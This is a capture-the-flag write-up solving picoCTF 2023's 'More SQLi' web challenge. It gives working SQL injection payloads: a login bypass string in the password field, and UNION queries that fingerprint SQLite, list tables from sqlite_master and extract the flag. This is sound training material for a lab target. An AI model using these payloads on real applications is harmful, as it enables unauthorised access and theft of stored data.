<h1>More SQLi</h1>

<h2>Overview</h2>

<p>200 points</p>

<p>Category: <a href="../">Web Exploitation</a></p>

<p>Tags : <code>#picoCTF 2023</code> <code>Web Exploitation</code> <code>sql</code></p>

<h2>Description</h2>

<p>Can you find the flag on this website.</p>

<p>Additional details will be available after launching your challenge instance.</p>

<h2>Solution</h2>

<p>After start of the instance picoCTF will provide you a link to running instance.</p>

<p>Site has login screen:</p>

<p><img src="1.jpg" alt="Screenshot of the login screen" /></p>

<p>If you type <code>user</code> username and <code>user</code> pass - you will get this message.</p>

<p><img src="2.jpg" alt="Screenshot of the login screen" /></p>

<p>So now we see the query for login request - it is obviously a hint for us, because when we know the query - we can easily get in with</p>

<p><code>'or 1=1;--</code> in <code>pass</code> field:</p>

<p><img src="3.jpg" alt="Screenshot of the login screen" /></p>

<p>Because the result query will be something like this:</p>

<p><code>SELECT id FROM users WHERE password = '' or 1=1;--' and username = '123'</code></p>

<p>We can test some queries to find out, what DB is used, and with this query: </p>

<p><code>123' UNION SELECT 1, sqlite_version(), 3;--</code> </p>

<p>we now know, that this site is using SQLite.</p>

<p><img src="4.jpg" alt="Screenshot of the site" /></p>

<p>Now we can just list all tables with this query </p>

<p><code>123' UNION SELECT name, sql, null from sqlite_master;--</code></p>

<p><img src="5.jpg" alt="Scrennshot of tables" /></p>

<p>Here is the flag - let's get it.</p>

<p><code>123' UNION SELECT flag, null, null from more_table;--</code></p>

<p><img src="6.jpg" alt="Screenshot of the flag" /></p>
